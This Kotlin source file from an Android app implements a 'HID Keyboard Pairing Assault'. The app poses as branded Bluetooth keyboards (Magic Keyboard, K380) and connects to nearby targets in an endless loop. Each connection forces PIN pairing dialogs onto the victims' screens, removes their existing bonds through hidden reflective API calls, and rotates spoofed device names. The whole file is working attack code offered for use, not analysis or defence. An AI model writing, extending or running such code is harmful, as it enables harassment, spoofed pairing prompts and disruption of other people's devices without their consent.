package com.sunfeld.smsgateway

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothHidDevice
import android.bluetooth.BluetoothHidDeviceAppSdpSettings
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

/**
 * HID Keyboard Pairing Assault — Cray Mode Vector 5.
 *
 * Unlike BluetoothPairingSpammer (which uses createBond() for a generic pairing dialog),
 * this registers as a real HID keyboard via BluetoothHidDevice API and calls
 * hidDevice.connect(). This triggers the much more alarming PIN entry dialog:
 * "Keyboard wants to pair — enter PIN: XXXXXX"
 *
 * The attack cycle per target:
 * 1. Set adapter name to a convincing keyboard profile (Magic Keyboard, K380, etc.)
 * 2. Register HID keyboard app with matching SDP settings
 * 3. Call hidDevice.connect(target) — triggers PIN pairing dialog on victim
 * 4. Wait for ACTION_PAIRING_REQUEST broadcast (confirms dialog rendered)
 * 5. After dwell time, disconnect + cancelBondProcess + removeBond
 * 6. Rotate to next keyboard profile, move to next target
 *
 * HID profile only supports one active connection at a time, so this is sequential —
 * but each hit is much higher impact than a generic bond request.
 */
@RequiresApi(Build.VERSION_CODES.P)
class HidPairingSpammer {

    companion object {
        private const val TAG = "HidPairingSpam"

        // How long to wait for the PIN dialog to fully render on the target
        const val DIALOG_DWELL_MS = 2000L
        // Time between targets (brief settle after disconnect)
        const val TARGET_CYCLE_MS = 300L
        // Time to wait for HID profile proxy to connect
        private const val PROXY_WAIT_MS = 3000L
        // Time to wait for HID app registration callback
        private const val REGISTER_WAIT_MS = 1500L

        // Keyboard profiles to rotate through — each shows a different name in the dialog
        val KEYBOARD_PROFILES: List<DeviceProfile> = DeviceProfiles.ALL
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private val _hitCount = MutableStateFlow(0)
    val hitCount: StateFlow<Int> = _hitCount.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _lastError = MutableStateFlow<String?>(null)
    val lastError: StateFlow<String?> = _lastError.asStateFlow()

    private var adapter: BluetoothAdapter? = null
    private var originalAdapterName: String? = null
    private var hidDevice: BluetoothHidDevice? = null
    private var registered = false
    private var proxyReady = false
    private var spamJob: Job? = null
    private var pairingReceiver: BroadcastReceiver? = null
    private var appContext: Context? = null
    private var profileIndex = 0

    // Signaled when ACTION_PAIRING_REQUEST is received (dialog appeared on target)
    private var pairingDetected = false

    private val hidCallback = object : BluetoothHidDevice.Callback() {
        override fun onAppStatusChanged(pluggedDevice: BluetoothDevice?, reg: Boolean) {
            Log.d(TAG, "HID app registered=$reg device=${pluggedDevice?.address}")
            registered = reg
        }

        override fun onConnectionStateChanged(device: BluetoothDevice, state: Int) {
            val stateName = when (state) {
                BluetoothProfile.STATE_CONNECTED -> "CONNECTED"
                BluetoothProfile.STATE_DISCONNECTED -> "DISCONNECTED"
                BluetoothProfile.STATE_CONNECTING -> "CONNECTING"
                BluetoothProfile.STATE_DISCONNECTING -> "DISCONNECTING"
                else -> "UNKNOWN($state)"
            }
            Log.d(TAG, "HID connection: ${device.address} -> $stateName")
        }

        override fun onGetReport(device: BluetoothDevice, type: Byte, id: Byte, bufferSize: Int) {
            // Respond with empty report to keep the connection alive during dwell
            hidDevice?.replyReport(device, type, id, ByteArray(8))
        }
    }

    private val profileListener = object : BluetoothProfile.ServiceListener {
        override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
            if (profile == BluetoothProfile.HID_DEVICE) {
                Log.d(TAG, "HID_DEVICE profile proxy connected")
                hidDevice = proxy as BluetoothHidDevice
                proxyReady = true
            }
        }

        override fun onServiceDisconnected(profile: Int) {
            if (profile == BluetoothProfile.HID_DEVICE) {
                Log.w(TAG, "HID_DEVICE profile proxy disconnected")
                hidDevice = null
                proxyReady = false
                registered = false
            }
        }
    }

    fun start(
        context: Context,
        targets: List<BluetoothDevice>
    ) {
        if (targets.isEmpty()) return
        if (_isRunning.value) return

        appContext = context.applicationContext
        _isRunning.value = true
        _hitCount.value = 0
        _lastError.value = null
        profileIndex = 0
        pairingDetected = false

        val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        adapter = btManager?.adapter

        if (adapter == null || adapter?.isEnabled != true) {
            _lastError.value = "Bluetooth not available"
            _isRunning.value = false
            return
        }

        try {
            originalAdapterName = adapter?.name
        } catch (e: SecurityException) {
            Log.w(TAG, "Cannot read adapter name", e)
        }

        // Register pairing request receiver to detect when the PIN dialog appears
        registerPairingReceiver(context)

        // Get HID profile proxy, then start the assault loop
        adapter?.getProfileProxy(context, profileListener, BluetoothProfile.HID_DEVICE)

        spamJob = scope.launch {
            // Wait for proxy to be ready
            val proxyDeadline = System.currentTimeMillis() + PROXY_WAIT_MS
            while (!proxyReady && System.currentTimeMillis() < proxyDeadline) {
                delay(100)
            }
            if (!proxyReady) {
                Log.e(TAG, "HID proxy did not connect in time")
                _lastError.value = "HID proxy timeout"
                return@launch
            }

            Log.d(TAG, "HID proxy ready, starting assault on ${targets.size} targets")
            CrashLogger.log(context, TAG, "HID Keyboard Assault started: ${targets.size} targets")

            // Main assault loop — round-robin through targets
            while (isActive) {
                for (device in targets) {
                    if (!isActive) break
                    try {
                        assaultTarget(context, device)
                    } catch (e: Exception) {
                        Log.w(TAG, "Assault on ${device.address} failed: ${e.message}")
                    }
                    delay(TARGET_CYCLE_MS)
                }
            }
        }
    }

    private suspend fun assaultTarget(context: Context, device: BluetoothDevice) {
        val hid = hidDevice ?: return
        val profile = nextProfile()

        // Step 1: Set adapter name to this keyboard profile
        try {
            adapter?.setName(profile.sdpName)
            Log.d(TAG, "Name set to '${profile.sdpName}' for ${device.address}")
        } catch (e: SecurityException) {
            Log.w(TAG, "Cannot set name", e)
        }

        // Step 2: Register HID app with this profile's SDP settings
        val sdpSettings = BluetoothHidDeviceAppSdpSettings(
            profile.sdpName,
            profile.sdpDescription,
            profile.sdpProvider,
            BluetoothHidDevice.SUBCLASS1_KEYBOARD,
            HidKeyReport.KEYBOARD_DESCRIPTOR
        )

        // Unregister previous app if registered
        if (registered) {
            try {
                hid.unregisterApp()
                registered = false
                delay(100)
            } catch (e: Exception) {
                Log.w(TAG, "unregisterApp failed: ${e.message}")
            }
        }

        try {
            hid.registerApp(sdpSettings, null, null, { it.run() }, hidCallback)
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException registering HID app", e)
            return
        }

        // Wait for registration callback
        val regDeadline = System.currentTimeMillis() + REGISTER_WAIT_MS
        while (!registered && System.currentTimeMillis() < regDeadline) {
            delay(50)
        }
        if (!registered) {
            Log.w(TAG, "HID app registration timed out for ${device.address}")
            return
        }

        // Step 3: Remove any existing bond (otherwise connect won't trigger dialog)
        val bondState = device.bondState
        if (bondState == BluetoothDevice.BOND_BONDED) {
            removeBond(device)
            delay(100)
        } else if (bondState == BluetoothDevice.BOND_BONDING) {
            cancelBond(device)
            delay(100)
        }

        // Step 4: Connect as HID keyboard — this triggers the PIN pairing dialog
        pairingDetected = false
        try {
            Log.d(TAG, "HID connect to ${device.address} as '${profile.sdpName}'")
            hid.connect(device)
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException connecting to ${device.address}", e)
            return
        }

        // Step 5: Dwell — wait for the PIN dialog to render on the target
        // If we detect ACTION_PAIRING_REQUEST, the dialog is showing
        val dwellEnd = System.currentTimeMillis() + DIALOG_DWELL_MS
        while (System.currentTimeMillis() < dwellEnd) {
            delay(100)
            if (pairingDetected) {
                Log.d(TAG, "PIN dialog detected on ${device.address}!")
                // Let it stay visible a bit longer
                delay(500)
                break
            }
        }

        _hitCount.value++
        val detected = if (pairingDetected) "PIN dialog confirmed" else "dwell completed"
        Log.d(TAG, "HID assault #${_hitCount.value} on ${device.address}: $detected (${profile.sdpName})")

        // Step 6: Rip it away — disconnect, cancel bond, remove bond
        try {
            hid.disconnect(device)
        } catch (e: Exception) {
            Log.w(TAG, "disconnect failed: ${e.message}")
        }
        delay(50)
        cancelBond(device)
        removeBond(device)
    }

    private fun nextProfile(): DeviceProfile {
        val profile = KEYBOARD_PROFILES[profileIndex % KEYBOARD_PROFILES.size]
        profileIndex++
        return profile
    }

    private fun cancelBond(device: BluetoothDevice) {
        try {
            val method = device.javaClass.getMethod("cancelBondProcess")
            method.invoke(device)
        } catch (_: Exception) { }
    }

    private fun removeBond(device: BluetoothDevice) {
        try {
            val method = device.javaClass.getMethod("removeBond")
            method.invoke(device)
        } catch (_: Exception) { }
    }

    private fun registerPairingReceiver(context: Context) {
        pairingReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action == BluetoothDevice.ACTION_PAIRING_REQUEST) {
                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                    }
                    val variant = intent.getIntExtra(BluetoothDevice.EXTRA_PAIRING_VARIANT, -1)
                    Log.d(TAG, "ACTION_PAIRING_REQUEST from ${device?.address} variant=$variant")
                    pairingDetected = true
                }
            }
        }

        val filter = IntentFilter(BluetoothDevice.ACTION_PAIRING_REQUEST)
        try {
            ContextCompat.registerReceiver(
                context,
                pairingReceiver!!,
                filter,
                ContextCompat.RECEIVER_EXPORTED
            )
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register pairing receiver: ${e.message}")
        }
    }

    fun stop(context: Context) {
        Log.d(TAG, "Stopping HID Keyboard Assault")
        _isRunning.value = false
        spamJob?.cancel()
        spamJob = null

        // Unregister HID app
        if (registered) {
            try {
                hidDevice?.unregisterApp()
            } catch (_: Exception) { }
            registered = false
        }

        // Close profile proxy
        hidDevice?.let { hid ->
            adapter?.closeProfileProxy(BluetoothProfile.HID_DEVICE, hid)
        }
        hidDevice = null
        proxyReady = false

        // Restore adapter name
        originalAdapterName?.let { name ->
            try { adapter?.setName(name) } catch (_: SecurityException) { }
        }

        // Unregister receiver
        pairingReceiver?.let {
            try { context.unregisterReceiver(it) } catch (_: Exception) { }
        }
        pairingReceiver = null

        CrashLogger.log(context, TAG, "HID Keyboard Assault stopped, ${_hitCount.value} hits")
    }
}
